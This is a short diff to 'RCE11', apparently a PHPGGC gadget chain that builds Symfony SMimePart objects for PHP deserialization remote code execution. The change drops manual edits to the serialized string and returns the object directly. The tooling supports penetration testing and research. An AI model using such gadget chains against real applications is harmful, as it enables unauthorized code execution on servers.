@@ -14,10 +14,8 @@ class RCE11 extends \PHPGGC\GadgetChain\RCE\FunctionCall
         $function = $parameters['function'];
         $param = $parameters['parameter'];
 
-        $a = new \Symfony\Component\Mime\Part\SMimePart($function,$param);
-        $ser = preg_replace("/([^\{]*\{)(.*)(s:49.*)(\})/","\\1\\3\\2\\4",serialize($a));
-        $ser = str_replace("i:9999","R:2",$ser);
+        $a = new \Symfony\Component\Mime\Part\SMimePart($function, $param);
 
-        return unserialize($ser);
+        return $a;
     }
 }
